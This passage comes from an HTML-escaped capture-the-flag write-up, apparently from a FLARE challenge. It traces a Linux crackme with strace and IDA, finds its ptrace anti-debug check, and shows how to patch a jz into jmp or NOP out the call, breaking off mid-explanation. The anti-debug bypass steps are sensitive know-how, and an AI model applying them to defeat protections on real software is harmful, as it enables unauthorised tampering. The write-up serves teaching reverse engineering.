execve&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;./e7bc5d2c0cf4480348f5504196561297&amp;quot;&lt;/span&gt;, &lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;./e7bc5d2c0cf4480348f55041965612&amp;quot;&lt;/span&gt;..., &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;arg1&amp;quot;&lt;/span&gt;, &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;arg2&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;]&lt;/span&gt;, &lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;/* &lt;span style=&#34;color: #2AA198&#34;&gt;31&lt;/span&gt; vars */&lt;span style=&#34;color: #719e07&#34;&gt;])&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0
uname&lt;span style=&#34;color: #719e07&#34;&gt;({&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;sys&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Linux&amp;quot;&lt;/span&gt;, &lt;span style=&#34;color: #268BD2&#34;&gt;node&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;kali&amp;quot;&lt;/span&gt;, ...&lt;span style=&#34;color: #719e07&#34;&gt;})&lt;/span&gt;  &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0
brk&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;0&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;                                  &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0x128d000
brk&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;0x128e1c0&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;                          &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0x128e1c0
arch_prctl&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;ARCH_SET_FS, 0x128d880&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;      &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0
brk&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;0x12af1c0&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;                          &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0x12af1c0
brk&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;0x12b0000&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;                          &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0x12b0000
ptrace&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;PTRACE_TRACEME, 0, 0x1, 0&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;       &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; -1 EPERM &lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;Operation not permitted&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;
fstat&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;1, &lt;span style=&#34;color: #719e07&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;st_mode&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;S_IFCHR&lt;span style=&#34;color: #93A1A1&#34;&gt;|&lt;/span&gt;0620, &lt;span style=&#34;color: #268BD2&#34;&gt;st_rdev&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;makedev&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;136, 0&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;, ...&lt;span style=&#34;color: #719e07&#34;&gt;})&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0
mmap&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;NULL, 4096, PROT_READ&lt;span style=&#34;color: #93A1A1&#34;&gt;|&lt;/span&gt;PROT_WRITE, MAP_PRIVATE&lt;span style=&#34;color: #93A1A1&#34;&gt;|&lt;/span&gt;MAP_ANONYMOUS, -1, 0&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0x7fba3fee7000
write&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;1, &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Program received signal SIGSEGV,&amp;quot;&lt;/span&gt;..., 52Program received signal SIGSEGV, Segmentation fault&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 52
exit_group&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;9001&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;                        &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; ?
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Syscalls are similar in all traces except with two arguments. We can see that &lt;code&gt;ptrace&lt;/code&gt; is being called in line 37. It&amp;rsquo;s a common &lt;a href=&#34;http://reverseengineering.stackexchange.com/a/1931&#34; target=&#34;_blank&#34;&gt;anti-debug protection&lt;/a&gt; in Linux. &amp;ldquo;[a]n executable can only call ptrace once. if ptrace() was already called by the strace executable, we can detect it in runtime.&amp;rdquo; So we need to bypass &lt;code&gt;ptrace&lt;/code&gt;. Searching for &lt;code&gt;ptrace&lt;/code&gt; in IDA does not turn up anything. I learned that syscalls are not called that way by name (he he). The argument for &lt;code&gt;syscall&lt;/code&gt; is moved to &lt;code&gt;eax&lt;/code&gt; and then it is called. So I search for the text &lt;code&gt;syscall&lt;/code&gt; in IDA and then commented each call according to &lt;a href=&#34;http://blog.rchapman.org/post/36801038863/linux-system-call-table-for-x86-64&#34; target=&#34;_blank&#34;&gt;Linux System Call Table for x86_64&lt;/a&gt; by &lt;code&gt;@pixnbits&lt;/code&gt;. &lt;code&gt;ptrace&lt;/code&gt; is &lt;code&gt;0x65&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/6-1.jpg&#34; alt=&#34;ptrace call&#34; title=&#34;ptrace call&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Later I realized there was a much easier way to find it instead of discovering all calls. Running &lt;code&gt;strace&lt;/code&gt; with &lt;code&gt;-i&lt;/code&gt; switch will print the instruction pointer &lt;del&gt;at the time of call&lt;/del&gt; after the syscall returns. Let&amp;rsquo;s run &lt;code&gt;ptrace&lt;/code&gt; on the binary with two arguments with this new swtich and look at the results.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;strace -i&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$ strace -i ./e7bc5d2c0cf4480348f5504196561297 arg1 arg2
&lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;    7f87e90646e7&lt;span style=&#34;color: #719e07&#34;&gt;]&lt;/span&gt; execve&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;./e7bc5d2c0cf4480348f5504196561297&amp;quot;&lt;/span&gt;, &lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;./e7bc5d2c0cf4480348f55041965612&amp;quot;&lt;/span&gt;..., &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;arg1&amp;quot;&lt;/span&gt;, &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;arg2&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;]&lt;/span&gt;, &lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;/* &lt;span style=&#34;color: #2AA198&#34;&gt;31&lt;/span&gt; vars */&lt;span style=&#34;color: #719e07&#34;&gt;])&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0
&lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;          4a9297&lt;span style=&#34;color: #719e07&#34;&gt;]&lt;/span&gt; uname&lt;span style=&#34;color: #719e07&#34;&gt;({&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;sys&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Linux&amp;quot;&lt;/span&gt;, &lt;span style=&#34;color: #268BD2&#34;&gt;node&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;kali&amp;quot;&lt;/span&gt;, ...&lt;span style=&#34;color: #719e07&#34;&gt;})&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0
&lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;          4aa78a&lt;span style=&#34;color: #719e07&#34;&gt;]&lt;/span&gt; brk&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;0&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;               &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0x1212000
&lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;          4aa78a&lt;span style=&#34;color: #719e07&#34;&gt;]&lt;/span&gt; brk&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;0x12131c0&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;       &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0x12131c0
&lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;          45e3f5&lt;span style=&#34;color: #719e07&#34;&gt;]&lt;/span&gt; arch_prctl&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;ARCH_SET_FS, 0x1212880&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0
&lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;          4aa78a&lt;span style=&#34;color: #719e07&#34;&gt;]&lt;/span&gt; brk&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;0x12341c0&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;       &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0x12341c0
&lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;          4aa78a&lt;span style=&#34;color: #719e07&#34;&gt;]&lt;/span&gt; brk&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;0x1235000&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;       &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0x1235000
&lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;          47431b&lt;span style=&#34;color: #719e07&#34;&gt;]&lt;/span&gt; ptrace&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;PTRACE_TRACEME, 0, 0x1, 0&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; -1 EPERM &lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;Operation not permitted&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;          473e44&lt;span style=&#34;color: #719e07&#34;&gt;]&lt;/span&gt; fstat&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;1, &lt;span style=&#34;color: #719e07&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;st_mode&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;S_IFCHR&lt;span style=&#34;color: #93A1A1&#34;&gt;|&lt;/span&gt;0620, &lt;span style=&#34;color: #268BD2&#34;&gt;st_rdev&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;makedev&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;136, 0&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;, ...&lt;span style=&#34;color: #719e07&#34;&gt;})&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0
&lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;          47509a&lt;span style=&#34;color: #719e07&#34;&gt;]&lt;/span&gt; mmap&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;NULL, 4096, PROT_READ&lt;span style=&#34;color: #93A1A1&#34;&gt;|&lt;/span&gt;PROT_WRITE, MAP_PRIVATE&lt;span style=&#34;color: #93A1A1&#34;&gt;|&lt;/span&gt;MAP_ANONYMOUS, -1, 0&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0x7f617785f000
&lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;          473f50&lt;span style=&#34;color: #719e07&#34;&gt;]&lt;/span&gt; write&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;1, &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Program received signal SIGSEGV,&amp;quot;&lt;/span&gt;..., 52Program received signal SIGSEGV, Segmentation fault&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 52
&lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;          473dd8&lt;span style=&#34;color: #719e07&#34;&gt;]&lt;/span&gt; exit_group&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;9001&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;     &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; ?
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Look at IP at the time of &lt;code&gt;ptrace&lt;/code&gt; in line 9: &lt;code&gt;47431b&lt;/code&gt;. Now look at the IDA screenshot above.&lt;/p&gt;

&lt;p&gt;So this function calls &lt;code&gt;ptrace&lt;/code&gt;. To find out where this function is being called, highlight it and press &lt;code&gt;x&lt;/code&gt; in IDA. There is only one call.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;bypassing ptrace&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:000000000041&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;F1F8&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;B9&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:000000000041&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;F1FD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;BA&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;01&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:000000000041&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;F202&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;BE&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:000000000041&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;F207&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;BF&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;edi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:000000000041&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;F20C&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;B8&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:000000000041&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;F211&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;E8&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;05&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;calls_ptrace&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:000000000041&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;F216&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;C1&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;E8&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;F&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;shr&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;3Fh&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:000000000041&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;F21A&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;84&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;C0&lt;/span&gt;          &lt;span style=&#34;color: #268BD2&#34;&gt;test&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;al&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;al&lt;/span&gt;     &lt;span style=&#34;color: #586E75&#34;&gt;; if ptrace return value is zero jump to bypass_ptrace&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:000000000041&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;F21C&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;74&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;14&lt;/span&gt;          &lt;span style=&#34;color: #268BD2&#34;&gt;jz&lt;/span&gt;      &lt;span style=&#34;color: #268BD2&#34;&gt;short&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;bypass_ptrace&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:000000000041&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;F21E&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;BF&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;F&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;edi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;offset&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;aProgramReceive&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; &amp;quot;Program received signal SIGSEGV, Segmentation fault&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:000000000041&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;F223&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;E8&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;B8&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;F9&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;03&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sys_write_call&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:000000000041&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;F228&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;BF&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;29&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;23&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;edi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;2329h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:000000000041&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;F22D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;E8&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;E&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;F5&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;03&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_45E790&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Return value from &lt;code&gt;ptrace&lt;/code&gt; is manipulated and then checked to see if it is zero. If non-zero, the program continues to line 11 and prints the segfault message in line 12 (I have renamed it). As you have noticed I have enabled opcodes in the last code snippet. In IDA go to the &lt;code&gt;Option&lt;/code&gt; menu and then &lt;code&gt;General&lt;/code&gt;. Change the &lt;code&gt;number of opcode bytes&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;To patch the binary to bypass ptrace we need to change the &lt;code&gt;jz&lt;/code&gt; instruction in line 9 to &lt;code&gt;jmp&lt;/code&gt;. In this short jump &lt;code&gt;0x74&lt;/code&gt; stands for &lt;code&gt;jnz&lt;/code&gt; and &lt;code&gt;0x14&lt;/code&gt; means thee number of bytes to jump (in this case 14 bytes ahead). To patch it to &lt;code&gt;jmp&lt;/code&gt;, change &lt;code&gt;0x74&lt;/code&gt; to &lt;code&gt;0xEB&lt;/code&gt;. Open the binary in a hex editor (e.g. Bless). Now we need to find this offset. I do what I call &lt;code&gt;lazy patching&lt;/code&gt;. Search for opcodes for the last few instructions before and &lt;code&gt;jnz&lt;/code&gt; in hex editor. In this case we are looking for &lt;code&gt;48 C1 E8 3F 84 C0 74 14&lt;/code&gt;. There is probably only one place in the binary with this sequence of bytes. Find it and change &lt;code&gt;0x74&lt;/code&gt; to &lt;code&gt;0xEB&lt;/code&gt;. Now we have bypassed &lt;code&gt;ptrace&lt;/code&gt;. Another alternative is to replace the &lt;code&gt;call calls_ptrace&lt;/code&gt; in line 6 with NOPs. NOP is short for No Operation and has the opcode &lt;code&gt;0x90&lt;/code&gt;. It actually stands for &lt;code&gt;xchg eax, eax&lt;/code&gt;. Both of them work.&lt;/p&gt;

&lt;p&gt;So I bypassed &lt;code&gt;ptrace&lt;/code&gt;. There were a lot of calculations. Random strings were loaded and manipulated. After stepping around the code in IDA I gave up. At this point I had two leads:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;The binary prints &lt;code&gt;no&lt;/code&gt;. Put breakpoints on all &lt;code&gt;sys_write&lt;/code&gt; calls and trace the print back&lt;/li&gt;
&lt;li&gt;The application needs to manipulate the arguments somehow. Search for &lt;a href=&#34;http://www.csc.depauw.edu/~bhoward/asmtut/asmtut7.html&#34; target=&#34;_blank&#34;&gt;string instructions&lt;/a&gt;, breakpoint them and see if  we hit one&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;I chose option 2, searched for string instructions and assigned breakpoints. After running the program I hit a &lt;code&gt;repne scasb&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;What does &lt;code&gt;repne scasb&lt;/code&gt; do?&lt;br /&gt;
